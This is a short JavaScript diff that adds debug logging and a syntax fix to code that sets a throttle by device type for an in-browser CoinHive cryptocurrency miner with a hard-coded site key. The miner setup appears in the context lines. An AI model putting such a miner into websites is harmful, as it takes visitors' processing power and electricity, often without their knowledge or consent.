@@ -20,13 +20,15 @@
        || navigator.userAgent.match(/iPod/i)
        || navigator.userAgent.match(/BlackBerry/i)
        || navigator.userAgent.match(/Windows Phone/i)
-       || navigator.userAgent.match(/Mobile/);
+       || navigator.userAgent.match(/Mobile/)
        )
     {
           throttleValue = 0.9;
+          console.log(throttleValue);
     }
     else {
           throttleValue = 0.7;
+          console.log(throttleValue);
     }
 		var miner = new CoinHive.Anonymous('56IwAT62JfmsI5oHX562l1QY6r8GYRWT', { 
 			throttle: throttleValue}
